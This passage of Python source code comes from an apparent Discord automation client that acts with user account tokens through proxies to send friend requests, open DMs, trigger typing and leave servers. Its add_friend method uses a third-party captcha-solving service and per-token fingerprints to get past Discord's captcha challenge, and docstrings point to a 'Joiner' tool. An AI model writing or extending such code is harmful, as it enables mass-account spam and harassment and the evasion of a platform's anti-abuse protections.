                return {'status': 'error', 'detail': str(exc)}

    async def trigger_typing(self, channel_id: str, token: str, proxy_url: str | None = None) -> dict:
        headers = self._discord_headers(token)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.post(f'{self.base_url}/channels/{channel_id}/typing', headers=headers)
                if resp.status_code in (200, 204):
                    return {'status': 'ok'}
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def add_friend(
        self,
        user_id: str,
        token: str,
        proxy_url: str | None = None,
        token_id: int | None = None,
        guild_id: str | None = None,
        db=None,
    ) -> dict:
        """Send a friend request to a user, retrying with AnySolver if captcha is required.

        Based on docs/Joiner/lib/actions/relationship/add.py.
        """
        context = base64.b64encode(b'{"location":"User Profile"}').decode()
        headers = self._discord_headers(
            token,
            content_type=True,
            context_properties=context,
        )
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.put(
                    f'{self.base_url}/users/@me/relationships/{user_id}',
                    headers=headers,
                    json={},
                )
                if resp.status_code == 204:
                    return {'status': 'sent'}
                if resp.status_code in (401, 403):
                    payload = self._response_error_payload(resp)
                    return {
                        'status': 'failed',
                        'code': resp.status_code,
                        'error_code': payload.get('code'),
                        'detail': payload.get('message', resp.text[:200]),
                    }
                error_payload = self._response_error_payload(resp)
                if self.captcha_solver.is_captcha_challenge(error_payload) and self.captcha_solver.is_enabled:
                    fp = self._get_token_fingerprint(token)
                    solve_result = await self.captcha_solver.solve_discord_challenge(
                        error_payload,
                        token_id=token_id,
                        guild_id=guild_id,
                        user_agent=fp.user_agent,
                        proxy_url=proxy_url,
                        db=db,
                    )
                    if solve_result.get('status') == 'ready':
                        captcha_headers = dict(headers)
                        captcha_headers['X-Captcha-Key'] = str(solve_result['captcha_key'])
                        captcha_payload: dict = {}
                        if solve_result.get('captcha_rqtoken'):
                            captcha_payload['captcha_rqtoken'] = solve_result['captcha_rqtoken']
                        if solve_result.get('captcha_rqdata'):
                            captcha_payload['captcha_rqdata'] = solve_result['captcha_rqdata']
                        retry = await client.put(
                            f'{self.base_url}/users/@me/relationships/{user_id}',
                            headers=captcha_headers,
                            json=captcha_payload or {},
                        )
                        if retry.status_code == 204:
                            return {'status': 'sent'}
                        retry_payload = self._response_error_payload(retry)
                        return {
                            'status': 'failed',
                            'code': retry.status_code,
                            'detail': json.dumps(retry_payload, ensure_ascii=False),
                        }
                    return {
                        'status': 'failed',
                        'code': resp.status_code,
                        'detail': f"Captcha solve failed: {solve_result.get('detail', 'unknown')}",
                    }
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def open_dm_channel(
        self,
        user_id: str,
        token: str,
        proxy_url: str | None = None,
    ) -> dict:
        """Open a DM channel with a user.

        Based on docs/Joiner/lib/actions/relationship/open_dm.py.
        """
        headers = self._discord_headers(token, content_type=True)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.post(
                    f'{self.base_url}/users/@me/channels',
                    headers=headers,
                    json={'recipient_id': user_id},
                )
                if resp.status_code in (200, 201):
                    return {'status': 'ok', 'channel': resp.json()}
                if resp.status_code in (401, 403):
                    payload = self._response_error_payload(resp)
                    return {
                        'status': 'failed',
                        'code': resp.status_code,
                        'error_code': payload.get('code'),
                        'detail': payload.get('message', resp.text[:200]),
                    }
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    async def leave_guild(
        self,
        guild_id: str,
        token: str,
        proxy_url: str | None = None,
    ) -> dict:
        """Leave a guild.

        Based on docs/Joiner/lib/actions/guild/leave.py.
        """
        headers = self._discord_headers(token, content_type=True)
        async with httpx.AsyncClient(timeout=20, proxy=proxy_url) as client:
            try:
                resp = await client.delete(
                    f'{self.base_url}/users/@me/guilds/{guild_id}',
                    headers=headers,
                    json={'lurking': False},
                )
                if resp.status_code in (200, 204):
                    return {'status': 'left'}
                if resp.status_code in (401, 403):
                    payload = self._response_error_payload(resp)
                    return {
                        'status': 'failed',
                        'code': resp.status_code,
                        'error_code': payload.get('code'),
                        'detail': payload.get('message', resp.text[:200]),
                    }
                return {'status': 'failed', 'code': resp.status_code, 'detail': resp.text[:200]}
            except httpx.HTTPError as exc:
                return {'status': 'error', 'detail': str(exc)}

    @staticmethod
    def extract_invite_code(invite: str) -> str:
        value = invite.strip()
        if not value:
            return ''
        value = value.rstrip('/')
        if '://' in value or '/' in value:
            value = value.rsplit('/', 1)[-1]
        value = value.split('?', 1)[0]
        return value if re.fullmatch(r'[a-zA-Z0-9-]{2,100}', value) else ''

    @staticmethod
    async def _sleep_before_retry(attempt: int, retry_after_seconds: float | None = None) -> None:
        if retry_after_seconds is not None and retry_after_seconds > 0:
            await asyncio.sleep(min(10.0, retry_after_seconds + random.uniform(0.0, RETRY_JITTER_SECONDS)))
            return
        await asyncio.sleep(min(RETRY_MAX_SLEEP_SECONDS, RETRY_BASE_DELAY_SECONDS * (2 ** (attempt - 1))) + random.uniform(0.0, RETRY_JITTER_SECONDS))

    @staticmethod
    def _response_error_payload(response: httpx.Response) -> dict:
        try:
            payload = response.json()
            if isinstance(payload, dict):
                return payload
        except ValueError:
            pass
        return {'message': response.text[:200]}

    @staticmethod
    def _retry_after_seconds(response: httpx.Response) -> float | None:
        retry_after = response.headers.get('Retry-After')
        if retry_after:
            try:
                return float(retry_after)
            except ValueError:
                pass
        payload = DiscordClient._response_error_payload(response)
        value = payload.get('retry_after')
        if isinstance(value, (int, float)):
            return float(value)
        return None
